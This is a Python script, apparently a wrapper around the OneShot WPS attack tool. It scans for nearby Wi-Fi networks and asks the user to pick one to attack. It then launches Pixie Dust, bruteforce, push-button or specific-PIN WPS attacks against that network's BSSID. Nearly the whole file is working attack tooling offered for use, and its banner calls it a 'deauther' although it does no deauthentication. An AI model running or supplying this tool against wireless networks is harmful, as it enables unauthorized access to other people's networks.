#!/usr/bin/env python3





#__-_-_-_-_-_+_-_-_-_+_+_+_+.  Colour 

class Colors:
    G = '\033[1;32m'   
    C = '\033[1;36m'   
    Y = '\033[1;33m'   
    R = '\033[1;31m'
    B = '\033[1;34m'
    M = '\033[1;35m'   
    W = '\033[1;37m'   
    N = '\033[0m'
    BOLD = '\033[1m'
import subprocess
#import os
import time
import re
import sys
from pathlib import Path
import threading
import random    
import os
import sys
import subprocess
import re
import threading
import random
def clear():
    os.system('clear')

def run_cmd(cmd, timeout=45):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout + result.stderr
    except:
        return ""



## interface 


def get_interfaces():
    print(f"{Colors.Y}{Colors.BOLD}[*] Detecting wireless interfaces..{Colors.W}")
    out = run_cmd("iw dev 2>/dev/null | grep -oP 'Interface \\K\\S+'")
    if not out.strip():
        out = run_cmd("ls /sys/class/net/ | grep -E 'wlan|wlp|p2p'")
    return [x.strip() for x in out.splitlines() if x.strip()]

def select_interface():
    ifaces = get_interfaces()
    if not ifaces:
        print("[!] No wireless interfaces found!")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("Available Wireless Interfaces")
    print("="*60)
    for i, iface in enumerate(ifaces, 1):
        print(f"  {i}. {iface}")
    print("="*60)
    
    while True:
        try:
            ch = int(input("\nSelect interface number: ")) - 1
            if 0 <= ch < len(ifaces):
                return ifaces[ch]
                
        except:
            print("Invalid input.")

def scan_networks(iface):

    clear()
#def print_banner():
  #  clear()

    title = "WIFI DEAUTHER BY ADITHYAN"
    glitch_chars = "!@#$%^&*<>/\\|▓▒░"
    frames = 8
    width = 64

    for frame in range(frames):
        clear()
        reveal_ratio = frame / (frames - 1)
        chars_locked = int(len(title) * reveal_ratio)

        display = ""
        for i, ch in enumerate(title):
            if ch == " " or i < chars_locked:
                display += ch
            else:
                display += random.choice(glitch_chars)

        print(f"{Colors.C}{Colors.BOLD}")
        print(f"\n{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}")
        print(f"          {Colors.W}{Colors.BOLD}        {display}{Colors.N}")
        print(f"{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}\n")
        sys.stdout.flush()
        time.sleep(0.06)

    # Final clean frame (locked, no glitch)
    clear()
    print(f"{Colors.C}{Colors.BOLD}")
    print(f"\n{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}")
    print(f"          {Colors.W}{Colors.BOLD}        {title}{Colors.N}")
    print(f"{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}\n")
    
    print(f"\n[*] SCANNING WI-FI ON {iface} ....")
    
    output = run_cmd(f"timeout 15s sudo iw dev {iface} scan 2>&1")

    networks = []
    seen = set()

    bss_blocks = re.split(r'BSS ', output)

    for block in bss_blocks[1:]:
        bssid_match = re.search(r'([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})', block)
        if not bssid_match:
            continue
        bssid = bssid_match.group(1).upper()
        if bssid in seen:
            continue
        seen.add(bssid)

        essid = "Hidden"
        essid_match = re.search(r'SSID:\s*(.+?)(?:\n|$)', block)
        if essid_match:
            essid = essid_match.group(1).strip()[:35]

        security = "Open"
        if re.search(r'RSN|WPA2', block, re.IGNORECASE):
            security = "WPA2"
        elif re.search(r'WPA', block, re.IGNORECASE):
            security = "WPA"
        elif re.search(r'Privacy', block):
            security = "WPS/A/WPA2"

        networks.append((bssid, essid, security))

    print(f"[*] Found {len(networks)} networks")
    return networks
    
    
    # selected network option

def select_network(networks):
    clear()
    
    if not networks:
        print("[!] No networks found.")
        return input("\nEnter target BSSID manually: ").strip()

    print("\n" + "="*70)
    print(f"{'#':<3} {'BSSID':<19} {'ESSID':<30} Security")
    print("="*70)
    
    for i, (bssid, essid, security) in enumerate(networks, 1):
        print(f"{i:<3} {bssid:<19} {essid:<30} {security}")
    
    print("="*70)

    while True:
        try:
            choice = input("\nEnter number to attack (0 = manual): ").strip()
            if choice == '0':
                return input("Enter BSSID: ").strip()
            idx = int(choice) - 1
            if 0 <= idx < len(networks):
                selected = networks[idx]
                print(f"\n[+] Selected: {selected[0]} | {selected[1]}")
                return selected[0]
        except:
            print("Invalid choice.")
  
def select_attack_mode():
    clear()
    print(f"{Colors.Y}{Colors.BOLD}")
    print(f"\n{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}")
    print(f"          {Colors.Y}{Colors.BOLD} WIFI WPS ATTACK BY ADITHYAN {Colors.Y}")
    print(f"{Colors.Y}{Colors.BOLD}════════════════════════════════════════════════════════════{Colors.Y}\n")
   # print(" ")
    print(f"{Colors.R}{Colors.BOLD}[*] [ ATTACK MODE ]{Colors.R}\n")
   # print(" ")
    
    
    


    
    
    print(f"{Colors.W}{Colors.BOLD} [1] Pixie Dust      {Colors.W}")
          
  # print(" ")
    print(" [2] Bruteforce      ")
  # print(" ")
    print(" [3] Push Button    ")
    
    print(" [4] Pixel Force     ")
    
    print(" [5] All Attack      ")
    
  # print(" ")
    print(" [6] Specific PIN    ")
  # print(" ")
    
    ch = input("\nChoose (1-6): ").strip()
    if ch == "1": return "-K"
    if ch == "2": return "-B"
    if ch == "3": return "--pbc"
    if ch == "4": return "-F"
    if ch == "5": return " "
    if ch == "6":
        pin = input("Enter PIN: ").strip()
        return f"-p {pin}"
    return "-K"
    #clear()
    #clear()

#def 

       
def main():
#def print_banner():
    clear()

    title = "WIFI DEAUTHER BY ADITHYAN"
    glitch_chars = "!@#$%^&*<>/\\|▓▒░"
    frames = 8
    width = 64

    for frame in range(frames):
        clear()
        reveal_ratio = frame / (frames - 1)
        chars_locked = int(len(title) * reveal_ratio)

        display = ""
        for i, ch in enumerate(title):
            if ch == " " or i < chars_locked:
                display += ch
            else:
                display += random.choice(glitch_chars)

        print(f"{Colors.C}{Colors.BOLD}")
        print(f"\n{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}")
        print(f"          {Colors.W}{Colors.BOLD}        {display}{Colors.N}")
        print(f"{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}\n")
        sys.stdout.flush()
        time.sleep(0.06)

    # Final clean frame (locked, no glitch)
    clear()
    print(f"{Colors.C}{Colors.BOLD}")
    print(f"\n{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}")
    print(f"          {Colors.W}{Colors.BOLD}        {title}{Colors.N}")
    print(f"{Colors.C}{Colors.BOLD}{'═' * width}{Colors.N}\n")
      
                  
            
      
    if os.geteuid() != 0:
        print("[!] Run with: sudo python3 oneshot_wrapper.py")
        sys.exit(1)
   #     clear()
    iface = select_interface()
    bssid = select_network(scan_networks(iface))
    mode = select_attack_mode()

  #  extra = " --iface-down" if input("\nUse --iface-down? (y/N): ").lower() == 'y' else ""

    cmd = f"sudo python3 oneshot.py -i {iface} -b {bssid} {mode}"
   # print(

    try:
        clear()
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\nStopped.")

if __name__ == "__main__":
    main()
    sys.exit(1)
